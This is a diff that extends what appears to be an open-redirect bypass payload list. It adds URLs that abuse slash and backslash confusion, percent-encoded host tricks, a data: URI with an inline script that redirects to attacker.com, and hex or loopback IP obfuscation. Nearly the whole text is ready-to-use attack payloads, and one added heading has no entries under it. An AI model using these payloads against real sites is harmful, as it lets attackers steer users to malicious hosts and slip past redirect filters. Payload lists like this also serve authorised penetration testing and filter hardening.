@@ -215,3 +215,20 @@ https://trusted.com/redir?url=//attacker.com
 https://trusted.com/redir?url=%2f%2fv1.attacker.com
 https://trusted.com/redir?url=https://trusted.com@attacker.com
 https://trusted.com/redir?url=https://attacker.com?trusted.com
+
+# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
+# slash / backslash karışıklığı
+/\/attacker.com
+\/\/attacker.com
+# scheme confusion
+data:text/html,<script>location='//attacker.com'</script>
+# host confusion (@ / . / % encoding)
+https://trusted.com%40attacker.com
+https://attacker.com%23.trusted.com
+https://attacker.com%2f.trusted.com
+https://attacker.com%3f.trusted.com
+# unicode / whitespace bypass
+# IP obfuscation redirect
+http://0x7f000001
+http://127.0.0.1%2f@attacker.com
+//google.com%2f%2f..%2f%2fattacker.com
